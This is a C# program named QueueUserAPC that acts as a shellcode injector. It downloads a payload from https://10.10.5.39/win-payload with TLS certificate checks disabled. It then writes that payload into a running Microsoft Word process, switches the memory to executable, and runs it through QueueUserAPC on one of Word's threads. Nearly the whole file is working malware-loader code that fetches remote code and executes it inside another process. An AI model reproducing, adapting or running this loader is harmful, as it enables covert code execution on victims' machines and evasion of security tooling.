using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;

namespace QueueUserAPC
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            try
            {
          /*      Process currentProcess = Process.GetCurrentProcess();
            var id = currentProcess.Id;*/

            // Fetch shellcode
            byte[] shellcode;

            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    shellcode = await client.GetByteArrayAsync("https://10.10.5.39/win-payload");
                }
            }

                Console.WriteLine($"Got shell code of length {shellcode.Length}");

                var wordProcess = Process.GetProcessesByName("WINWORD");
                ProcessThreadCollection currentThreads = wordProcess[0].Threads;

                /*foreach (var p in wordProcess)
                {
                    Console.WriteLine($"WINWORD process found with ID: {p.Id}");
                    currentThreads = Process.GetProcessById(p.Id).Threads;
                }*/


                Console.WriteLine("Calling Process id " + wordProcess[0].Id + "\nProcess " + wordProcess[0].ProcessName);
                // Allocate memory
                // Allocate memory
                var baseAddress = Win32.VirtualAllocEx(
                     wordProcess[0].Handle,
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
                    Win32.MemoryProtection.ReadWrite);

                IntPtr byteswritten;
                // Write shellcode
                Win32.WriteProcessMemory(
                    wordProcess[0].Handle,
                    baseAddress,
                    shellcode,
                    shellcode.Length,
                    out byteswritten);
                Win32.MemoryProtection mem;
                // Flip memory protection
                Win32.VirtualProtectEx(
                    wordProcess[0].Handle,
                    baseAddress,
                    (uint)shellcode.Length,
                    Win32.MemoryProtection.ExecuteRead,
                    out mem);
                var threadHandle = Win32.OpenThread(0x777, false, (uint)wordProcess[0].Threads[1].Id);
                // Queue the APC
                Win32.QueueUserAPC(
                    baseAddress, // point to the shellcode location
                   threadHandle,  // primary thread of process
                    0);

                // Resume the thread
                Win32.ResumeThread(threadHandle);
            }
                catch(Exception e)
                {
                    Console.WriteLine(e);
                }
            
            
        }

    }
    internal class Win32
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [Flags]
    public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200)
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(uint desiredAccess, bool inheritHandle, uint threadId);

        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr handle);

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CreateProcessW(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            AllocationType flAllocationType,
            MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            MemoryProtection flNewProtect,
            out MemoryProtection lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern uint QueueUserAPC(
            IntPtr pfnAPC,
            IntPtr hThread,
            uint dwData);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(
            IntPtr hThread);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }
    }
}
